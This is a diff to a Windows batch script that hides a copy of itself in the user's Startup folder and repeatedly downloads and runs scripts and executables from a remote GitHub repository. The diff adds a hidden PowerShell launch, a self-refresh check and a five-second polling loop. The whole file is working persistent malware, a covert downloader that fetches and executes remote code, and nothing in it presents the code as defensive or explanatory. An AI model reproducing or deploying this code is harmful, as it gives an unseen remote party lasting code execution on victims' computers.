@@ -1,6 +1,7 @@
 @echo off
+powershell -NoP -W hidden ; exit
 set "_path=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\.trevi.bat"
-if not exist "%_path%" (
+fc "%~f0" "%_path%" || (
     xcopy "%~f0" "%_path%"
     attrib +h +s +r "%_path%"
 )
@@ -18,7 +19,7 @@ for /f %%i in ('curl -kLs "https://github.com/aritz331/getadmin/raw/main/current
 call :checkExtension exe exe "call"
 call :checkExtension bat batch "cmd /c"
 call :checkExtension py python "python"
-call :checkExtension none exe "exit /b 0"
+call :checkExtension trevi exe "goto pauseNLoop"
 exit /b
 
 :checkExtension
@@ -31,3 +32,7 @@ exit /b
 curl -kLOs "https://github.com/aritz331/getadmin/raw/main/scripts/%~1"
 %~2 %_currentScript%
 exit /b
+
+:pauseNLoop
+timeout 5 /nobreak >nul
+goto :getScript
